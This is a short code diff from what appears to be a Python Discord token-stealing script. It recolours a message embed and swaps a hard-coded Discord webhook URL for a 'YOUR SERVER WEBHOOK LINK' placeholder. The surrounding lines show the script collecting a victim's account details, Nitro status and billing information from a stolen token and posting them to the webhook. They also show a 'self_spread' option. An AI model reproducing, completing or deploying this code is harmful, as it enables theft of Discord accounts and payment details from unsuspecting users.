@@ -156,7 +156,7 @@ def main():
             nitro = bool(user_data.get("premium_type"))
             billing = bool(has_payment_methods(token))
             embed = {
-                "color": 0x7289da,
+                "color": 0xca1515,
                 "fields": [
                     {
                         "name": "**Account Info**",
@@ -196,7 +196,7 @@ def main():
         "avatar_url": "https://i.pinimg.com/originals/be/01/8e/be018e38bffe82606fa38b4dab72e360.jpg"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/796580525712212018/aGIEaarKuiPOo6JxDxRu1EZYljPzDVI8D6C5kz9Ja4s92WfH4Mc0K-xbDx1AKBKcZn8g", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("YOUR SERVER WEBHOOK LINK", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
